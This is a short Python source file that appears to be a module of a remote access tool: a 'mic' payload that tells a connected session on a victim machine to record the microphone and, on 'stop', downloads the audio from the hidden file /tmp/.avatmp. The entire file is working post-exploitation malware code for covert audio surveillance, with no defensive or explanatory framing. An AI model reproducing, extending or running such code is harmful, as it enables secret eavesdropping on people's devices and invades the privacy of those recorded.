class payload:
    def __init__(self):
        self.name = "mic"
        self.description = "record mic"
        self.type = "download"
        self.id = 114

    def run(self,session,server,command):
        result = server.sendCommand(command.split()[0],command[4:],"native",session.conn)
        #print output
        if len(result) > 0 and result != "1":
            print result
        #if we should stop, download file
        if len(command.split()) > 1:
            if command.split()[1] == "stop":
                #if we are stopping, receive the go ahead
                if result == "1":
                    server.sendCommand("download","/tmp/.avatmp","download",session.conn)
        return ""
